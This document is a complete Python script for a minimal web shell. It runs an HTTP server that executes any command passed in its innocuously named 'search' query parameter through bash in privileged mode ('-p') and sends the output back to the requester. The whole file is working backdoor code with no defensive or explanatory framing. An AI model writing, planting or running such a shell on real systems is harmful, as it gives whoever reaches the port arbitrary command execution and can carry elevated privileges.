#!/usr/bin/env python3
import sys
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote_plus

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9999


def run_command(cmd: str) -> dict:
    try:
        result = subprocess.run(
            ["/bin/bash", "-p", "-c", cmd],
            capture_output=True, text=True, timeout=3000000000,
        )
        return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Timeout", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        params = parse_qs(urlparse(self.path).query)
        cmd = unquote_plus(params.get("search", [""])[0])

        if not cmd.strip():
            body = b"no cmd"
        else:
            res = run_command(cmd)
            output = (res["stdout"] + res["stderr"]).encode("utf-8")
            body = output if output.strip() else b"(no output)"

        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        print(f"[{self.address_string()}] {fmt % args}")


if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), Handler)
    print(f"Running on http://{HOST}:{PORT}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")
